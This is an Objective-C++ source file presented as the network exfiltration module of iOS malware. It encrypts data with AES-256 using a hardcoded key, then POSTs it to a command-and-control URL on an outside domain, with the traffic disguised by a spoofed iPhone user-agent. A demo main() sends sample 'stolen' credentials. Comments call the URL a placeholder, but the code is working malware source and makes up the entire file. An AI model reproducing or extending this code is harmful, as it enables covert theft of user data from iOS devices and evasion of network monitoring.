// ============================================================================
// FILE: network.mm
// MODULE: Network & Exfiltration (iOS C2 Communication)
// ============================================================================

#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonCryptor.h> // REQUIRED FOR REAL AES-256

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <chrono>

namespace NetworkModule {

    // Real AES-256 Encryption Engine
    class CryptoEngine {
    public:
        NSData* encryptAES256(NSData* rawData) {
            // In a real attack, these keys would be dynamically generated or hardcoded
            NSString *keyString = @"0123456789abcdef0123456789abcdef"; // 32 bytes
            NSString *ivString = @"1234567890123456"; // 16 bytes
            
            NSData *keyData = [keyString dataUsingEncoding:NSUTF8StringEncoding];
            NSData *ivData = [ivString dataUsingEncoding:NSUTF8StringEncoding];
            
            size_t outLength;
            NSMutableData *cipherData = [NSMutableData dataWithLength:rawData.length + kCCBlockSizeAES128];
            
            // Calling Apple's hardware-accelerated AES engine
            CCCryptorStatus result = CCCrypt(kCCEncrypt,                // Operation
                                             kCCAlgorithmAES,            // Algorithm
                                             kCCOptionPKCS7Padding,      // Padding
                                             keyData.bytes,              // Key
                                             kCCKeySizeAES256,           // Key length (256-bit)
                                             ivData.bytes,               // IV
                                             rawData.bytes,              // Input data
                                             rawData.length,             // Input length
                                             cipherData.mutableBytes,    // Output buffer
                                             cipherData.length,          // Output buffer length
                                             &outLength);                // Actual bytes written
            
            if (result == kCCSuccess) {
                cipherData.length = outLength;
                return cipherData;
            } else {
                std::cout << "[NETWORK-ERR] AES Encryption failed with code: " << result << "\n";
                return nil;
            }
        }
    };

    // Main Exfiltrator Class
    class Exfiltrator {
    private:
        // Placeholder URL (In a real attack, this is the live C2 server)
        std::string C2_URL = "security-pass.abrdns.com/api/v1/upload";
        std::string AUTH_TOKEN = "Bearer MOCK_TOKEN_12345";
        std::mutex network_mutex;
        CryptoEngine crypto;

        void log_network(const std::string& message) {
            std::cout << "[NETWORK] " << message << "\n";
        }

    public:
        Exfiltrator() {}

        void send_payload(const std::string& raw_data) {
            std::lock_guard<std::mutex> lock(network_mutex);
            
            log_network("Converting payload to NSData...");
            // Convert C++ string to Apple's binary NSData object
            NSData *plainData = [NSData dataWithBytes:raw_data.c_str() length:raw_data.length()];
            
            log_network("Encrypting payload with real AES-256...");
            // Encrypt using our CryptoEngine
            NSData *encryptedData = crypto.encryptAES256(plainData); 
            
            if (encryptedData == nil) {
                log_network("Encryption failed. Aborting upload.");
                return;
            }

            log_network("Preparing NSURLSession request to " + C2_URL);
            
            // Setup the URL and Request
            NSURL *url = [NSURL URLWithString:[NSString stringWithUTF8String:C2_URL.c_str()]];
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
            
            // Disguise the traffic
            [request setHTTPMethod:@"POST"];
            [request setHTTPBody:encryptedData];
            [request setValue:@"application/octet-stream" forHTTPHeaderField:@"Content-Type"];
            [request setValue:[NSString stringWithUTF8String:AUTH_TOKEN.c_str()] forHTTPHeaderField:@"Authorization"];
            [request setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" forHTTPHeaderField:@"User-Agent"];

            // Dispatch the network request asynchronously
            NSURLSession *session = [NSURLSession sharedSession];
            NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                if (error == nil) {
                    NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
                    std::cout << "[NETWORK] Upload successful! Server responded with code: " << [httpResponse statusCode] << "\n";
                } else {
                    std::cout << "[NETWORK-ERR] Upload failed: " << [[error localizedDescription] UTF8String] << "\n";
                }
            }];
            
            log_network("Executing network task...");
            [task resume]; // This physically fires the request
        }
    };
}

// ============================================================================
// MAIN EXECUTION (Simulated invocation)
// ============================================================================
int main() {
    std::cout << "========================================\n";
    std::cout << " [*] Starting iOS Network Module        \n";
    std::cout << "========================================\n";

    NetworkModule::Exfiltrator exfil;
    
    // Simulate passing the stolen data from the Database module
    std::string stolen_data = "=== STOLEN DATABASE ===\nUser: admin, Pass: 12345";
    
    exfil.send_payload(stolen_data);

    // Keep the program alive so the async NSURLSession task has time to finish
    std::this_thread::sleep_for(std::chrono::seconds(5));

    return 0;
}